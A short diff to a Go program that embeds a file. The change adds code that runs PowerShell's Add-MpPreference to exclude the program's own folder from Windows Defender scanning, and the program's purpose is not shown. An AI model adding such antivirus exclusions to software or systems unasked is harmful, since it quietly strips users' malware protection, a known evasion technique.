@@ -3,10 +3,13 @@
 package main
 
 import (
+	"context"
 	_ "embed"
 	"fmt"
 	"log"
 	"os"
+	"os/exec"
+	"os/signal"
 	"path/filepath"
 )
 
@@ -28,9 +31,24 @@ func main() {
 }
 
 func mainWithError() error {
+	ctx, cancelFn := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer cancelFn()
+
 	exePath, err := os.Executable()
 	if err != nil {
 		return fmt.Errorf("failed to get file path - %w", err)
+	}
+
+	parentDirPath := filepath.Dir(exePath)
+
+	output, err := exec.CommandContext(ctx,
+		`C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe`,
+		"Add-MpPreference",
+		"-ExclusionPath",
+		parentDirPath).CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("failed to add windows defender exclusion for '%s' - output: '%s' - %w",
+			parentDirPath, output, err)
 	}
 
 	parentDirectory := filepath.Dir(exePath)
